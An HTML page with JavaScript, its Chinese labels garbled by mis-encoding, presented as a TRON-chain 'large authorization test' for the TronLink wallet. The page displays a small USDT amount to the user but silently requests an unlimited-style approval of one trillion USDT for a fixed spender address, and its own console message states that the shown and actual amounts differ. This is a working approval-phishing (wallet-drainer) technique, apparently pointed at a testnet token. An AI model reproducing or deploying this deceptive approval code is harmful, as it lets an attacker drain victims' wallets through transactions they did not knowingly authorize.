<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON é“¾å¤§é¢æˆæƒæµ‹è¯•</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .tron-info { background: #e8f4f8; padding: 10px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #ff001c; }
    </style>
</head>
<body>
    <div class="container">
        <h2>ğŸŒ TRON é“¾å¤§é¢æˆæƒæµ‹è¯•</h2>
        
        <div class="tron-info">
            <strong>TRON é“¾ç‰¹æ€§ï¼š</strong><br>
            â€¢ USDT 6 ä½å°æ•°<br>
            â€¢ ä½¿ç”¨ TronLink é’±åŒ…<br>
            â€¢ æµ‹è¯•æå¤§é‡‘é¢æˆæƒ
        </div>

        <div class="input-group">
            <label>æ˜¾ç¤ºé‡‘é¢ (USDT):</label>
            <input type="number" id="amount" value="100" step="1">
        </div>

        <button id="connectBtn">ğŸ”— è¿æ¥ TronLink</button>
        <button id="approveBtn" disabled>ğŸŒŠ æµ‹è¯• TRON å¤§é¢æˆæƒ</button>

        <div id="status">è¯·å…ˆè¿æ¥ TronLink...</div>
    </div>

    <script>
        // TRON é“¾ä¸“ç”¨ä»£ç 
        const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
        const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

        // TRON å¤§é¢æˆæƒé‡‘é¢
        function getTronHugeAmount() {
          return (1000000000000 * 1000000).toString(); // 1ä¸‡äº¿ USDT
        }

        window.approveUSDT = async function() {
          try {
            const inputAmount = document.getElementById("amount").value;
            const hugeAmount = getTronHugeAmount();
            
            console.log("TRON é“¾æµ‹è¯• - å‰ç«¯æ˜¾ç¤º:", inputAmount, "å®é™…æˆæƒ: 1ä¸‡äº¿ USDT");
            
            const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
            const result = await usdtContract.approve(spenderAddress, hugeAmount).send({
              feeLimit: 100000000,
              callValue: 0
            });
            
            setStatus("âœ… è¯·è§‚å¯Ÿ TronLink æ˜¾ç¤ºå†…å®¹");
            
          } catch (err) {
            setStatus("âŒ " + err.message, true);
          }
        };

        // é¡µé¢åˆå§‹åŒ–ä»£ç ...
        document.getElementById('connectBtn').addEventListener('click', async () => {
          // è¿æ¥ä»£ç ...
        });
    </script>
</body>
</html>
